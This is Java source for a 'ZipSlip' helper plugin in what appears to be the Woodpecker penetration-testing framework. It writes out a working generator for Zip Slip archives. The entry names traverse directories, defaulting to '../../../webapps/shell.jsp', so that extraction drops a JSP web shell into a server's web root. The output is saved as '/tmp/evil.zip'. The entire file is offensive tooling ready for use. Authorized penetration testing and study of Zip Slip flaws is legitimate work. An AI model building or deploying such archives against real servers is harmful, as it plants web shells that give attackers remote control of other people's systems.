package me.gv7.woodpecker.plugin;

import me.gv7.woodpecker.tools.common.FileUtil;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.zip.Deflater;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class ZipSlip implements IHelper{
    private IResultOutput resultOutput;

    public String getHelperTabCaption() {
        return "zip slip";
    }

    public IArgsUsageBinder getHelperCutomArgs() {
        IArgsUsageBinder argsUsageBinder = ZipTools.pluginHelper.createArgsUsageBinder();
        List<IArg> args = new ArrayList<IArg>();
        IArg args1 = ZipTools.pluginHelper.createArg();
        args1.setName("compress_file_1");
        args1.setDefaultValue("/tmp/shell.jsp");
        args1.setDescription("要压缩的目标");
        args1.setRequired(true);
        args.add(args1);

        IArg compressName = ZipTools.pluginHelper.createArg();
        compressName.setName("compress_name_1");
        compressName.setDefaultValue("../../../webapps/shell.jsp");
        compressName.setDescription("解压的路径");
        compressName.setRequired(true);
        args.add(compressName);


        IArg saveFile = ZipTools.pluginHelper.createArg();
        saveFile.setName("save_file");
        saveFile.setDefaultValue("/tmp/evil.zip");
        saveFile.setDescription("生成文件的保存路径");
        saveFile.setRequired(true);
        args.add(saveFile);

        argsUsageBinder.setArgsList(args);
        return argsUsageBinder;
    }

    public void generateEvilZip(Map<String,String> unm,String saveFile) throws Exception{
        ZipOutputStream zipOutputStream = new ZipOutputStream(new FileOutputStream(saveFile));
        zipOutputStream.setLevel(Deflater.BEST_COMPRESSION);
        for(Map.Entry<String,String> un:unm.entrySet()){
            String filePath = un.getKey();
            String compressName = un.getValue();
            zipOutputStream.putNextEntry(new ZipEntry(compressName));
            zipOutputStream.write(FileUtil.readFile(filePath));
            zipOutputStream.flush();
            this.resultOutput.infoPrintln(String.format("Compress %s to %s finish",filePath,compressName));
        }
        zipOutputStream.close();
    }


    public void doHelp(Map<String, Object> customArgs, IResultOutput resultOutput) throws Throwable {
        this.resultOutput = resultOutput;
        Map<String,String> cus = new HashMap<String, String>();
        for(Map.Entry<String,Object> arg:customArgs.entrySet()){
            String key = arg.getKey();
            String compress_file = (String)arg.getValue();
            if(key.startsWith("compress_file_")){
                String id = key.substring("compress_file_".length(),key.length());
                String uncompress = (String)customArgs.get(String.format("compress_name_%s",id));
                cus.put(compress_file,uncompress);
            }
        }

        String saveFile = (String)customArgs.get("save_file");
        generateEvilZip(cus,saveFile);
        resultOutput.successPrintln(String.format("Save file %s success!",saveFile));
    }
}
